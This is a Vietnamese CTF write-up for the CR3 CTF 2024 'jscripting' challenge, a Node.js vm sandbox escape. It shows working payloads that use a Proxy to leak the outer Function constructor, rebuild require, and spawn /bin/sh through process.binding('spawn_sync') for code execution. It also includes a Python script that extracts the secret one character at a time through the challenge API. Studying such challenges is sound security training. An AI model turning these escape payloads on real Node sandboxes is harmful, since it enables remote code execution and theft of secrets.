---
title: "CR3 CTF 2024: nodejs cơ bản cho người mới bắt đầu"
description: "CR3 CTF 2024: nodejs cơ bản cho người mới bắt đầu"
summary: "CR3 CTF 2024: nodejs cơ bản cho người mới bắt đầu"
categories: ["Writeup"]
tags: ["Pwnable", "Reverse", "Web"]
#externalUrl: ""
date: 2024-05-03
draft: false
authors:
  - Shin24
---



Tối hôm trước mình có làm vài bài bên CR3 CTF để warmup cho Hacktheon 2024 vào thứ 7, sau đây là writeup của mình cho 2 bài `jscripting` và `jscripting-revenge`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/3e7c5b74-9ef1-4a96-9e07-07dd01ac4fca)

# Jscripting
Có thể nói đây là một nodejs sandbox dùng worker thread để chạy external code, dùng một custom `require` function chỉ cho phép gọi đến một danh sách các module giới hạn, mục tiêu sẽ là exfiltrate được flag hay secret gì đó. Module `vm` của nodejs được chọn để chạy external code, tuy nhiên module này không được tạo ra với mục đích bảo mật, đây chỉ là module giúp lập trình viên run code trong một context khác để tránh xung đột và ảnh hưởng đến các object ở context chính. Để escape ra `vm` thì việc thường làm sẽ là tìm cách leak các object từ bên ngoài thông qua các callback hoặc proxy
```js
(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor('return 123'))();
         }
         return me[key];
  }
})
```
Khi kết quả được trả về nó sẽ được cast về chuỗi thông qua `String()` hoặc `JSON.stringify`, đối với `JSON.stringify` nó sẽ invoke hàm `toJSON` của object, nếu invoke nghĩa là trước đó nó sẽ cần get method này, do đó method `get` của proxy sẽ được trigger, từ đó ta có thể tuy cập đến `arguments.callee.caller` và leak được object `JSON.stringify`. Ở đây thì `require` đã bị thay thế như bên trên đề cập, `globalThis.process` cũng bị set về null nhưng `globalThis.module` thì vẫn còn, ta có thể invoke tới `globalThis.module.constructor.createRequire` để tạo lại function `require`.
```
1});(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor(' globalThis.module.constructor.createRequire("/etc/passwd")("child_process").execSync("ls")'))();
         }
         return me[key];
  }
})
```

Khi chạy payload trên ta nhận về một lỗi:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/97c034ab-ced2-4f3b-b09f-148bffbb333b)

Khi mình trace vào source code của nodejs thì như sau:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cc096d1d-0ed5-4aed-a8c3-507e4bccebe2)

Nhìn lại code của đề:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/152a2cf5-01da-4d94-895c-b000753864fc)

Không rõ là vô tình hay cố ý nhưng việc set `process.env` thành null khiến cho ta không thể invoke `exec` của `child_process` được nữa. Một fact đó là `globalThis.process` thật ra là một module và được nodejs auto expose ra, ta có thể chủ đông import lại module này bằng cách `require("process")`, ở đây ta có thể đơn giản là set `process.env = {}` để không gặp lỗi khi chạy `child_process` nữa, cách của mình thì lại lợi dụng `process.binding` để truy cập đến các low level API của nodejs, cụ thể là `spawn_sync` để RCE
```js
1});(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor(' globalThis.module.constructor.createRequire("/etc/passwd")("process").binding("spawn_sync").spawn({file: "/bin/sh",args: ["/bin/sh","-c", "calc.exe" ], stdio: [ {type:"pipe",readable:true,writable:false}, {type:"pipe",readable:false,writable:true}, {type:"pipe",readable:false,writable:true} ]})'))();
         }
         return me[key];
  }
})
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/22a895ca-6fa1-4f10-95f2-a8264ce4c7d0)

Thực chất ta có thể exfiltrate biến `flag`, nhưng flag thật thì nằm ở `secret`, code để oracle attack biến `flag`:
```
import requests
import string

data = "1});(() => { throw new Proxy({}, {\n  get: function(me, key) {\n\t const cc = arguments.callee.caller;\n\t if (cc != null) {\n\t\treturn (cc.constructor.constructor('if (Object.getOwnPropertyDescriptor(globalThis.storage, \"secret\").value[INDEX] == \"CHAR\") {return 200}else{return 404}'))();\n\t }\n\t return me[key];\n  }\n})"
charset = string.printable
flag = "cr3{"
for i in range(4 ,100):
    for c in charset:
        payload = data.replace("INDEX", str(i)).replace("CHAR", c)
        try:
            r = requests.post("https://jscripting.1337.sb/api/execute", json={
                "script": payload
            })
            print(c)
            if "OK" in r.text:
                flag += c
                print("===>" + flag)
                if c == "}":
                    exit()
                break
        except:
            pass
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e8c7725e-a07c-4d66-9360-3f1927392741)

# Jscripting-revenge [UPDATING...]
